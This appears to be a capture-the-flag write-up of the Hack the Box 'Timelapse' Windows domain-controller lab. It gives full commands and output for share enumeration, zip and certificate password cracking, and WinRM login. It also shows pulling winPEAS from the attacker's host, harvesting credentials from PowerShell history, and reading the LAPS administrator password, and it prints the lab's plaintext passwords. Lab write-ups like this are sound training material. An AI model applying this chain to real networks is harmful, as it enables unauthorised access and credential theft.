---
layout: post
title:  "Hack the Box - Timelapse"
category: "Writeups"
---

## NMAP
# Commands

```bash
sudo nmap -sC -sV 10.10.11.152 -T4 -vv -oN scans/results.nmap
```

# Results

```bash
PORT      STATE SERVICE           REASON          VERSION                                                                                                                                                                                  
53/tcp    open  domain            syn-ack ttl 127 Simple DNS Plus                                                                                                                                                                          
88/tcp    open  kerberos-sec      syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2022-04-02 00:41:41Z)                                                                                                                           
135/tcp   open  msrpc             syn-ack ttl 127 Microsoft Windows RPC                                                                                                                                                                    
139/tcp   open  netbios-ssn       syn-ack ttl 127 Microsoft Windows netbios-ssn                                                                                                                                                            
389/tcp   open  ldap              syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)                                                                                         
445/tcp   open  microsoft-ds?     syn-ack ttl 127                                                                                                                                                                                          
464/tcp   open  kpasswd5?         syn-ack ttl 127                                                                                                                                                                                          
593/tcp   open  ncacn_http        syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0                                                                                                                                                      
636/tcp   open  ldapssl?          syn-ack ttl 127                                                                                                                                                                                          
3268/tcp  open  ldap              syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)                                                                                         
3269/tcp  open  globalcatLDAPssl? syn-ack ttl 127                                                                                                                                                                                          
5986/tcp  open  ssl/http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```


## SMB
# Anonymous 
```bash
smbclient -L //10.10.11.152/ 


Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Shares          Disk      
        SYSVOL          Disk      Logon server share
```


# CME 
- We had to install using docker


# Docker process
This is a list of guides I used for using docker in this case
- Get docker command from CME github
- [YT Link](https://www.youtube.com/watch?v=QBOcKdh-fwQ)
- [Guide](https://www.digitalocean.com/community/tutorials/how-to-remove-docker-images-containers-and-volumes)
- [Docker docs](https://docs.docker.com/engine/reference/commandline/rename/)

```bash
sudo docker run 6cc968e59baa smb 10.10.11.152 -u 'Anonymous' -p '' --shares
```

- We see Anonymous can read the Shares and IPC$

## Shares Folder
- We log in with smbclient

```bash
smbclient -U 'Anonymous' //<IP>/Shares
```

- Two folders: Dev and HelpDesk

### Dev
- winrm_backup.zip

### HelpDesk
- 3 docx(s)
- Possible User: Jiri Formacek, Tom Ausburne
- OperationGuide: Looks like random password but "7c3XlgsE"

# WinRM_Backup.zip
- Using zip2john, we can get the hash for the zip file

```bash
zip2john winrm_backup.zip > hash.txt
```

```bash
john hash.txt --wordlist=rockyou.txt
```
- After cracking the hash, we get the password "supremelegacy" and we can unzip the folder now giving us the .pfx

- We can install [Crackpkcs12](https://sourceforge.net/projects/crackpkcs12/) and/or [Crackpkcs12](https://github.com/crackpkcs12/crackpkcs12)
- Now we can crack the pfx

```bash
crackpkcs12 -b legacyy_dev_auth.pfx -M 15 -d rockyou.txt -v
```
Password -> thuglegacy

## Evil-WinRM over HTTPS

- [Check this link out](https://0xer3bus.gitbook.io/notes/windows/active-directory/winrm-using-certificate-pfx-.#for-linux)
- Follow the steps below:
- Passphrase I used: turco123
- Now we can try to log in with evil-winrm and SSL

```bash
sudo /home/turco/hacking-tools/evil-winrm/evil-winrm.rb -i timelapse.htb -S -k private.pem -c cert.crt -p ''
```
- We are in as legacyy

![[legacy-whoami.png]](/images/HTB/Timelapse/legacy-whoami.png)


## Enumeration

```powershell-session
whoami /all


USER INFORMATION                                                                                                                                                                                                                           
----------------

User Name         SID
================= ============================================
timelapse\legacyy S-1-5-21-671920749-559770252-3318990721-1603


GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                          Attributes
=========================================== ================ ============================================ ==================================================
Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
TIMELAPSE\Development                       Group            S-1-5-21-671920749-559770252-3318990721-3101 Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity  Well-known group S-1-18-1                                     Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.

```


```windows

whoami /groups


Enter PEM pass phrase:

GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                          Attributes
=========================================== ================ ============================================ ==================================================
Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
TIMELAPSE\Development                       Group            S-1-5-21-671920749-559770252-3318990721-3101 Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity  Well-known group S-1-18-1                                     Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
```


```windows
whoami /privs

Enter PEM pass phrase:

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```




```windows
net localgroup

Enter PEM pass phrase:

Aliases for \\DC01

-------------------------------------------------------------------------------
*Access Control Assistance Operators
*Account Operators
*Administrators
*Allowed RODC Password Replication Group
*Backup Operators
*Cert Publishers
*Certificate Service DCOM Access
*Cryptographic Operators
*Denied RODC Password Replication Group
*Distributed COM Users
*DnsAdmins
*Event Log Readers
*Guests
*Hyper-V Administrators
*IIS_IUSRS
*Incoming Forest Trust Builders
*Network Configuration Operators
*Performance Log Users
*Performance Monitor Users
*Pre-Windows 2000 Compatible Access
*Print Operators
*RAS and IAS Servers
*RDS Endpoint Servers
*RDS Management Servers
*RDS Remote Access Servers
*Remote Desktop Users
*Remote Management Users
*Replicator
*Server Operators
*Storage Replica Administrators
*Terminal Server License Servers
*Users
*Windows Authorization Access Group
The command completed successfully.

```

## Winpeas
[Upload x64 version onto machine](https://adamtheautomator.com/powershell-download-file/)

```windows
Invoke-WebRequest -Uri 'http://10.10.14.7:8001/winPEASx64.exe' -OutFile 'C:\Users\legacyy\Documents\winPEAS.exe'
```
# Output
- PowerShell Command History:

```text
C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

- Folder: 

```windows
C:\windows\tasks
    FolderPerms: Authenticated Users [WriteData/CreateFiles]
   =================================================================================================


    Folder: C:\windows\system32\tasks
    FolderPerms: Authenticated Users [WriteData/CreateFiles]
```	
	

PowerShell History:
```
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
```
- Password: 
```text
'E3R$Q62^12p7PLlC%KWaxuaV'
```

- Possible Creds? 

```text
svc_deploy : E3R$Q62^12p7PLlC%KWaxuaV
```
- We could also search for certain strings, rather than winpeas:

```cmd
findstr /si ConvertTo-SecureString
```
```cmd
findstr /si Credential
```

## SMB as svc_deploy
```bash
sudo docker run 6cc968e59baa smb 10.10.11.152 -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV' --shares


Share           Permissions     Remark
SMB         10.10.11.152    445    DC01             -----           -----------     ------
SMB         10.10.11.152    445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.152    445    DC01             C$                              Default share
SMB         10.10.11.152    445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.152    445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.11.152    445    DC01             Shares          READ            
SMB         10.10.11.152    445    DC01             SYSVOL          READ            Logon server share
```

```bash
sudo docker run 6cc968e59baa smb 10.10.11.152 -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV' --users

timelapse.htb\TRX                            badpwdcount: 0 baddpwdtime: 2022-03-04 03:06:26.138123+00:00
SMB         10.10.11.152    445    DC01             timelapse.htb\svc_deploy                     badpwdcount: 0 baddpwdtime: 2021-10-25 19:17:42.060764+00:00
SMB         10.10.11.152    445    DC01             timelapse.htb\babywyrm                       badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         10.10.11.152    445    DC01             timelapse.htb\sinfulz                        badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         10.10.11.152    445    DC01             timelapse.htb\legacyy                        badpwdcount: 2 baddpwdtime: 2022-04-03 00:19:58.197536+00:00
SMB         10.10.11.152    445    DC01             timelapse.htb\payl0ad                        badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         10.10.11.152    445    DC01             timelapse.htb\thecybergeek                   badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         10.10.11.152    445    DC01             timelapse.htb\krbtgt                         badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         10.10.11.152    445    DC01             timelapse.htb\Guest                          badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         10.10.11.152    445    DC01             timelapse.htb\Administrator                  badpwdcount: 13 baddpwdtime: 2022-04-02 01:04:53.150654+00:00
```
- Now we have a valid user list we can make and creds to run with bloodhound

- Tricks for cutting file to get user list
```bash
cat users.lst| awk '{print $5}' > users.txt
```
```bash
cat users.txt| cut -d'\' -f2- > newUsers.txt
```

## Bloodhound
```bash
bloodhound-python -c All -u svc_deploy -d timelapse.htb -dc timelapse.htb -ns 10.10.11.152 --zip 
```

```bash
sudo docker run -v ./bloohound-data -it bloodhound 
```

- We can try to WinRM in and enumerate as this account

## Evil-WinRM
- Doing basic enum again (groups, privs), we find the user is apart of the "LAPS_Reader" group
[Another resource about LAPS](https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/you-might-want-to-audit-your-laps-permissions/ba-p/2280785)

- Running the command in the service account session gives the Admin password and we can log in
Creds: 

```text
Administrator : 6;w9aKqtw@#ZH}6&@Uw69]iv
```

![[svc_deploy_admin_pass.png]](/images/HTB/Timelapse/svc_deploy_admin_pass.png)
- Other resource: [Check this out](https://www.hackingarticles.in/credential-dumpinglaps/)

# Admin
![[admin-proof.png]](/images/HTB/Timelapse/admin-proof.png)